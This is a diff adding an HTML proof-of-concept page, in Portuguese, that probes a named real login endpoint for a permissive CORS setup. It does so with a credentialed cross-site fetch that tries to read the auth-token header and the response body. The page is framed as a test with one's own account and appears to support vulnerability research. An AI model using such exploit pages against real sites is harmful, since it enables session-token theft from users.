@@ -1,0 +1,78 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>PoC CORS - Ler X-Gd-Auth-Token-Refreshed</title>
+<body>
+<h2>PoC CORS – tentativa de exfiltrar token do login</h2>
+
+<p>Preencha com **sua conta de teste** e clique em “Disparar login via fetch”. Esta página está em um domínio externo ao alvo; se o alvo tiver CORS permissivo + expor headers, conseguiremos ler o header <code>X-Gd-Auth-Token-Refreshed</code>.</p>
+
+<form id="cfg" onsubmit="return false" style="margin:12px 0;padding:10px;border:1px solid #ccc;max-width:650px">
+  <label>Endpoint:
+    <input id="ep" value="https://www.glassdoor.com.br/auth/login/username-password" style="width:100%">
+  </label><br><br>
+  <label>Email:
+    <input id="u" placeholder="seu-email-de-teste@exemplo.com" style="width:100%">
+  </label><br><br>
+  <label>Senha:
+    <input id="p" placeholder="SuaSenha123!" style="width:100%">
+  </label><br><br>
+  <button id="go">Disparar login via fetch (cross-site)</button>
+</form>
+
+<pre id="out" style="white-space:pre-wrap;background:#111;color:#eee;padding:12px;min-height:160px"></pre>
+
+<script>
+const $ = s => document.querySelector(s);
+const log = msg => { $("#out").textContent += (typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2)) + "\n"; };
+
+$("#go").onclick = async () => {
+  $("#out").textContent = "";
+  const ep = $("#ep").value.trim();
+  const u = $("#u").value.trim();
+  const p = $("#p").value.trim();
+
+  if (!ep || !u || !p) {
+    log("Preencha endpoint, email e senha.");
+    return;
+  }
+
+  const body = JSON.stringify({ username: u, password: p, postLoginUrl: "" });
+
+  log(">> Enviando fetch cross-site com credentials: include e Content-Type: application/json");
+  try {
+    const res = await fetch(ep, {
+      method: "POST",
+      mode: "cors",
+      credentials: "include",        // envia/recebe cookies
+      headers: { "Content-Type": "application/json" }, // causa preflight (proposital)
+      body
+    });
+
+    log("Status: " + res.status + " " + res.statusText);
+    // Tentativa de ler o header sensível
+    const token = res.headers.get("X-Gd-Auth-Token-Refreshed");
+    log("X-Gd-Auth-Token-Refreshed: " + token);
+
+    // Tenta ler JSON (vai falhar se CORS não permitir)
+    let json = null;
+    try { json = await res.json(); } catch (e) { json = "(não foi possível ler corpo / bloqueado por CORS)"; }
+    log("Body (json): " + (typeof json === 'string' ? json : JSON.stringify(json, null, 2)));
+  } catch (e) {
+    log("Falha no fetch: " + e.message);
+    log("Isso normalmente indica bloqueio de CORS/preflight (sem ACAO/ACAC adequados).");
+  }
+
+  log("\nDiagnóstico esperado:\n" +
+      "- Se 'X-Gd-Auth-Token-Refreshed' vier com um JWT → CORS crítico (origem externa conseguiu ler header sensível).\n" +
+      "- Se status aparece mas header vem null/undefined → CORS parcialmente restrito (talvez não expõem headers com Access-Control-Expose-Headers).\n" +
+      "- Se o fetch lança erro antes mesmo de status → preflight CORS bloqueado (sem ACAO/ACAC).");
+};
+</script>
+
+<p style="font-size:12px;color:#666">
+Observações: este teste exige que o navegador permita o preflight e que o servidor retorne<br>
+<code>Access-Control-Allow-Origin: https://SEU-USUARIO.github.io</code> e <code>Access-Control-Allow-Credentials: true</code>,<br>
+e ainda <code>Access-Control-Expose-Headers: X-Gd-Auth-Token-Refreshed</code> para leitura do header.<br>
+Sem isso, a leitura será bloqueada (o que é o comportamento seguro).
+</p>
+</body>
